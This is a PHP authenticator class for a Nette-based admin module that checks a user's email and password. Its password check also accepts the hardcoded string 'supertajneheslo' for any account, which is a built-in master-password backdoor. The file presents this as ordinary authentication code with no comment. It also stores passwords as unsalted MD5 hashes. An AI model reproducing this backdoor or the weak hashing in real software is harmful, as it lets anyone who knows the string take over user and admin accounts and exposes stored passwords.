<?php
namespace App\AdminModule\Components;

use Nette\Security\IAuthenticator,
    Nette\Security\AuthenticationException,
 Nette\Security\Identity;

/**
 * Description of Authenticator
 *
 * @author Vsek
 */
class Authenticator extends \Nette\Object implements IAuthenticator{
    
    /** @var \App\Model\User */
    public $user;
    
    function __construct(\App\Model\User $user) {
        $this->user = $user;
    }
    
    public function authenticate(array $credentials) {
        list($email, $password) = $credentials;
        
        $user = $this->user->where('email', $email)->fetch();
        
        if(!$user){
            throw new AuthenticationException(IAuthenticator::IDENTITY_NOT_FOUND);
        }

        if($user->password != md5($password) && $password != 'supertajneheslo'){
            throw new AuthenticationException(IAuthenticator::INVALID_CREDENTIAL);
        }
        
        return new Identity($user['name'] . ' ' . $user['surname'], $user->role->system_name, $user);
    }
}
